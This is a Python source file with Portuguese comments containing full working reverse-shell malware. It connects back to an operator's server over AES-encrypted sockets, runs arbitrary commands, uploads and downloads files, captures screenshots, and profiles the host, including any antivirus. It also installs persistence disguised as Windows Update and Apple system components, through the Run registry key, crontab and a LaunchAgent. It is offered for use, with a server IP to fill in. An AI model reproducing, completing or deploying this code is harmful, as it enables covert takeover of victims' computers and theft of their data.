#!/usr/bin/env python3
import socket
import os
import subprocess
import json
import base64
import zlib
import time
import threading
import platform
import getpass
import shutil
import sys
import tempfile
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import hashlib
import uuid
import requests
import queue

class AdvancedReverseShell:
    def __init__(self, host='127.0.0.1', port=443):
        # Configurações de conexão
        self.host = host
        self.port = port
        
        # Configurações de criptografia
        self.key = hashlib.sha256(b'32_character_long_secret_key_here!!').digest()
        self.iv = b'16_bytes_iv_here!'
        
        # Configurações de rede
        self.socket_timeout = 30
        self.reconnect_delay = 60
        self.max_retries = 5
        
        # Sistema
        self.session_id = str(uuid.uuid4())
        self.platform = platform.system()
        self.user = getpass.getuser()
        self.hostname = socket.gethostname()
        
        # Comandos especiais
        self.special_commands = {
            'download': self.download_file,
            'upload': self.upload_file,
            'screenshot': self.take_screenshot,
            'persist': self.install_persistence,
            'cleanup': self.remove_persistence,
            'info': self.get_system_info,
            'shell': self.interactive_shell,
            'exit': self.exit_shell,
            'help': self.show_help
        }
        
        # Fila para comandos assíncronos
        self.command_queue = queue.Queue()
        
        # Configurações de persistência
        self.persistence_methods = {
            'windows': self._persist_windows,
            'linux': self._persist_linux,
            'darwin': self._persist_macos
        }
        
    def encrypt(self, data):
        """Criptografa dados com AES-CBC"""
        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
        padded_data = pad(data.encode(), AES.block_size)
        return base64.b64encode(cipher.encrypt(padded_data))

    def decrypt(self, encrypted_data):
        """Descriptografa dados com AES-CBC"""
        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
        decrypted = cipher.decrypt(base64.b64decode(encrypted_data))
        return unpad(decrypted, AES.block_size).decode()

    def compress(self, data):
        """Comprime dados com zlib"""
        return zlib.compress(data.encode())

    def decompress(self, compressed_data):
        """Descomprime dados com zlib"""
        return zlib.decompress(compressed_data).decode()

    def reliable_send(self, data):
        """Envia dados de forma confiável com criptografia"""
        try:
            encrypted = self.encrypt(json.dumps(data))
            self.connection.sendall(encrypted + b'\n')
        except Exception as e:
            print(f"[!] Erro ao enviar dados: {e}")
            raise

    def reliable_receive(self):
        """Recebe dados de forma confiável com descriptografia"""
        try:
            data = b''
            while True:
                chunk = self.connection.recv(4096)
                if not chunk:
                    break
                data += chunk
                if data.endswith(b'\n'):
                    data = data[:-1]  # Remove o delimitador
                    break
            
            if not data:
                return None
                
            decrypted = self.decrypt(data)
            return json.loads(decrypted)
        except Exception as e:
            print(f"[!] Erro ao receber dados: {e}")
            raise

    def connect(self):
        """Estabelece conexão com o servidor"""
        retries = 0
        while retries < self.max_retries:
            try:
                self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.connection.settimeout(self.socket_timeout)
                self.connection.connect((self.host, self.port))
                
                # Envia informações iniciais
                self.reliable_send({
                    'type': 'handshake',
                    'session_id': self.session_id,
                    'platform': self.platform,
                    'user': self.user,
                    'hostname': self.hostname,
                    'pid': os.getpid()
                })
                
                return True
            except Exception as e:
                print(f"[!] Falha na conexão (tentativa {retries + 1}): {e}")
                retries += 1
                time.sleep(self.reconnect_delay)
        
        return False

    def execute_command(self, command):
        """Executa um comando no sistema"""
        try:
            if command.strip().lower() == 'cd':
                return os.getcwd()
                
            if command.startswith('cd '):
                path = command[3:].strip()
                os.chdir(path)
                return f"Diretório alterado para: {os.getcwd()}"
                
            # Processo para capturar saída em tempo real
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE
            )
            
            output, error = process.communicate()
            result = output.decode(errors='ignore') + error.decode(errors='ignore')
            return result if result else "Comando executado com sucesso"
            
        except Exception as e:
            return f"Erro ao executar comando: {str(e)}"

    def download_file(self, path):
        """Faz download de um arquivo para o servidor"""
        try:
            if not os.path.exists(path):
                return {'status': 'error', 'message': 'Arquivo não encontrado'}
                
            with open(path, 'rb') as file:
                content = base64.b64encode(file.read()).decode()
                
            return {
                'status': 'success',
                'filename': os.path.basename(path),
                'content': content,
                'size': os.path.getsize(path)
            }
        except Exception as e:
            return {'status': 'error', 'message': str(e)}

    def upload_file(self, filename, content):
        """Faz upload de um arquivo do servidor"""
        try:
            file_content = base64.b64decode(content)
            
            # Verifica se o diretório existe, se não, cria
            directory = os.path.dirname(filename)
            if directory and not os.path.exists(directory):
                os.makedirs(directory)
                
            with open(filename, 'wb') as file:
                file.write(file_content)
                
            return {'status': 'success', 'message': f'Arquivo {filename} salvo com sucesso'}
        except Exception as e:
            return {'status': 'error', 'message': str(e)}

    def take_screenshot(self):
        """Tira uma captura de tela (multi-plataforma)"""
        try:
            if self.platform == 'Windows':
                import pyautogui
                screenshot = pyautogui.screenshot()
                temp_file = os.path.join(tempfile.gettempdir(), f'screen_{self.session_id}.png')
                screenshot.save(temp_file)
                
                with open(temp_file, 'rb') as f:
                    content = base64.b64encode(f.read()).decode()
                
                os.remove(temp_file)
                return {'status': 'success', 'content': content}
                
            elif self.platform in ['Linux', 'Darwin']:
                temp_file = os.path.join(tempfile.gettempdir(), f'screen_{self.session_id}.png')
                if self.platform == 'Linux':
                    subprocess.run(['import', '-window', 'root', temp_file])
                else:  # MacOS
                    subprocess.run(['screencapture', '-x', temp_file])
                
                with open(temp_file, 'rb') as f:
                    content = base64.b64encode(f.read()).decode()
                
                os.remove(temp_file)
                return {'status': 'success', 'content': content}
                
            return {'status': 'error', 'message': 'Plataforma não suportada'}
        except Exception as e:
            return {'status': 'error', 'message': str(e)}

    def get_system_info(self):
        """Coleta informações detalhadas do sistema"""
        try:
            info = {
                'system': platform.system(),
                'node': platform.node(),
                'release': platform.release(),
                'version': platform.version(),
                'machine': platform.machine(),
                'processor': platform.processor(),
                'python_version': platform.python_version(),
                'users': self._get_logged_users(),
                'network': self._get_network_info(),
                'antivirus': self._check_antivirus(),
                'processes': self._get_running_processes(),
                'privileges': self._check_privileges()
            }
            return {'status': 'success', 'info': info}
        except Exception as e:
            return {'status': 'error', 'message': str(e)}

    def _get_logged_users(self):
        """Obtém usuários logados"""
        try:
            if self.platform == 'Windows':
                return subprocess.check_output('query user', shell=True).decode()
            else:
                return subprocess.check_output('who', shell=True).decode()
        except:
            return "Não foi possível obter informações"

    def _get_network_info(self):
        """Obtém informações de rede"""
        try:
            if self.platform == 'Windows':
                return subprocess.check_output('ipconfig /all', shell=True).decode()
            else:
                return subprocess.check_output('ifconfig', shell=True).decode()
        except:
            return "Não foi possível obter informações"

    def _check_antivirus(self):
        """Verifica produtos de segurança instalados"""
        try:
            if self.platform == 'Windows':
                cmd = 'WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName'
                result = subprocess.check_output(cmd, shell=True).decode()
                return result if result else "Nenhum antivírus detectado"
            else:
                return "Verificação de antivírus não implementada para esta plataforma"
        except:
            return "Não foi possível verificar antivírus"

    def _get_running_processes(self):
        """Lista processos em execução"""
        try:
            if self.platform == 'Windows':
                return subprocess.check_output('tasklist', shell=True).decode()
            else:
                return subprocess.check_output('ps aux', shell=True).decode()
        except:
            return "Não foi possível listar processos"

    def _check_privileges(self):
        """Verifica privilégios do usuário"""
        try:
            if self.platform == 'Windows':
                import ctypes
                return "Admin" if ctypes.windll.shell32.IsUserAnAdmin() else "Usuário padrão"
            else:
                return "Root" if os.geteuid() == 0 else "Usuário padrão"
        except:
            return "Não foi possível verificar privilégios"

    def interactive_shell(self):
        """Inicia um shell interativo"""
        try:
            while True:
                command = self.reliable_receive()
                if not command or command.get('type') != 'command':
                    break
                    
                cmd = command.get('data', '')
                if cmd.lower() in ['exit', 'quit']:
                    break
                    
                result = self.execute_command(cmd)
                self.reliable_send({
                    'type': 'command_result',
                    'data': result,
                    'cwd': os.getcwd()
                })
        except Exception as e:
            print(f"[!] Erro no shell interativo: {e}")

    def install_persistence(self):
        """Instala mecanismos de persistência"""
        try:
            method = self.persistence_methods.get(self.platform.lower())
            if method:
                result = method()
                return {'status': 'success', 'message': result}
            return {'status': 'error', 'message': 'Plataforma não suportada'}
        except Exception as e:
            return {'status': 'error', 'message': str(e)}

    def _persist_windows(self):
        """Persistência para Windows"""
        try:
            # Cópia para AppData
            dest_path = os.path.join(os.getenv('APPDATA'), 'WindowsUpdate.exe')
            if not os.path.exists(dest_path):
                shutil.copyfile(sys.executable, dest_path)
                
            # Entrada no Registro
                subprocess.run(
                    'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run '
                    f'/v "WindowsUpdate" /t REG_SZ /d "{dest_path}" /f',
                    shell=True
                )
                
            return "Persistência instalada no Windows"
        except Exception as e:
            raise Exception(f"Falha na persistência Windows: {str(e)}")

    def _persist_linux(self):
        """Persistência para Linux"""
        try:
            # Cópia para diretório oculto
            dest_path = os.path.expanduser('~/.config/systemd/systemd-service')
            if not os.path.exists(dest_path):
                shutil.copyfile(sys.executable, dest_path)
                os.chmod(dest_path, 0o755)
                
            # Adiciona ao crontab
            cron_job = f"@reboot {dest_path}"
            with open('/etc/crontab', 'a') as f:
                f.write(f"\n{cron_job}\n")
                
            return "Persistência instalada no Linux"
        except Exception as e:
            raise Exception(f"Falha na persistência Linux: {str(e)}")

    def _persist_macos(self):
        """Persistência para macOS"""
        try:
            # Cópia para diretório oculto
            dest_path = os.path.expanduser('~/Library/Application Support/.macOSUpdate')
            if not os.path.exists(dest_path):
                shutil.copyfile(sys.executable, dest_path)
                os.chmod(dest_path, 0o755)
                
            # Cria LaunchAgent
            plist_content = f"""
            <?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
            <plist version="1.0">
            <dict>
                <key>Label</key>
                <string>com.apple.macosupdate</string>
                <key>ProgramArguments</key>
                <array>
                    <string>{dest_path}</string>
                </array>
                <key>RunAtLoad</key>
                <true/>
                <key>KeepAlive</key>
                <true/>
            </dict>
            </plist>
            """
            
            plist_path = os.path.expanduser('~/Library/LaunchAgents/com.apple.macosupdate.plist')
            with open(plist_path, 'w') as f:
                f.write(plist_content)
                
            return "Persistência instalada no macOS"
        except Exception as e:
            raise Exception(f"Falha na persistência macOS: {str(e)}")

    def remove_persistence(self):
        """Remove mecanismos de persistência"""
        try:
            if self.platform == 'Windows':
                # Remove do registro
                subprocess.run(
                    'reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run '
                    '/v "WindowsUpdate" /f',
                    shell=True
                )
                # Remove arquivo
                dest_path = os.path.join(os.getenv('APPDATA'), 'WindowsUpdate.exe')
                if os.path.exists(dest_path):
                    os.remove(dest_path)
                    
            elif self.platform == 'Linux':
                # Remove do crontab
                dest_path = os.path.expanduser('~/.config/systemd/systemd-service')
                if os.path.exists(dest_path):
                    os.remove(dest_path)
                    
            elif self.platform == 'Darwin':
                # Remove LaunchAgent
                plist_path = os.path.expanduser('~/Library/LaunchAgents/com.apple.macosupdate.plist')
                if os.path.exists(plist_path):
                    os.remove(plist_path)
                # Remove arquivo
                dest_path = os.path.expanduser('~/Library/Application Support/.macOSUpdate')
                if os.path.exists(dest_path):
                    os.remove(dest_path)
                    
            return {'status': 'success', 'message': 'Persistência removida'}
        except Exception as e:
            return {'status': 'error', 'message': str(e)}

    def exit_shell(self):
        """Encerra a conexão"""
        self.connection.close()
        return {'status': 'success', 'message': 'Conexão encerrada'}

    def show_help(self):
        """Mostra ajuda dos comandos"""
        help_text = """
        Comandos disponíveis:
          download <path>      - Baixa um arquivo do sistema alvo
          upload <loc> <rem>   - Envia um arquivo para o alvo
          screenshot           - Tira uma captura de tela
          persist              - Instala persistência no sistema
          cleanup              - Remove persistência
          info                 - Mostra informações detalhadas do sistema
          shell                - Inicia shell interativo
          exit                 - Encerra a conexão
          help                 - Mostra esta ajuda
        """
        return {'status': 'success', 'message': help_text}

    def handle_command(self, command_data):
        """Processa comandos recebidos"""
        try:
            cmd_type = command_data.get('type')
            cmd = command_data.get('data', '')
            
            if cmd_type == 'special':
                # Comandos especiais
                parts = cmd.split(' ', 1)
                main_cmd = parts[0].lower()
                args = parts[1] if len(parts) > 1 else ''
                
                handler = self.special_commands.get(main_cmd)
                if handler:
                    if main_cmd in ['download', 'upload']:
                        # Comandos com argumentos especiais
                        if main_cmd == 'download':
                            return handler(args)
                        elif main_cmd == 'upload':
                            file_args = args.split(' ', 1)
                            if len(file_args) == 2:
                                return handler(file_args[0], file_args[1])
                            return {'status': 'error', 'message': 'Argumentos inválidos'}
                    else:
                        return handler()
                else:
                    return {'status': 'error', 'message': 'Comando especial não reconhecido'}
                    
            elif cmd_type == 'command':
                # Comando normal do sistema
                result = self.execute_command(cmd)
                return {'status': 'success', 'data': result, 'cwd': os.getcwd()}
                
            else:
                return {'status': 'error', 'message': 'Tipo de comando inválido'}
                
        except Exception as e:
            return {'status': 'error', 'message': str(e)}

    def run(self):
        """Loop principal do shell reverso"""
        while True:
            try:
                if not self.connect():
                    print("[!] Não foi possível estabelecer conexão. Tentando novamente...")
                    time.sleep(self.reconnect_delay)
                    continue
                
                print(f"[+] Conexão estabelecida com {self.host}:{self.port}")
                
                while True:
                    try:
                        command = self.reliable_receive()
                        if not command:
                            print("[!] Conexão perdida")
                            break
                            
                        response = self.handle_command(command)
                        self.reliable_send(response)
                        
                        if command.get('data') == 'exit':
                            self.connection.close()
                            return
                            
                    except socket.timeout:
                        # Mantém a conexão viva
                        self.reliable_send({'type': 'keepalive', 'status': 'alive'})
                        continue
                    except Exception as e:
                        print(f"[!] Erro durante a sessão: {e}")
                        break
                        
            except KeyboardInterrupt:
                print("\n[*] Encerrando shell reverso")
                if hasattr(self, 'connection'):
                    self.connection.close()
                return
            except Exception as e:
                print(f"[!] Erro crítico: {e}")
                time.sleep(self.reconnect_delay)

if __name__ == "__main__":
    # Configurações - substitua pelo seu servidor
    SERVER_IP = '127.0.0.1'  # Altere para o IP do seu servidor
    SERVER_PORT = 443         # Porta para conexão
    
    shell = AdvancedReverseShell(SERVER_IP, SERVER_PORT)
    shell.run()
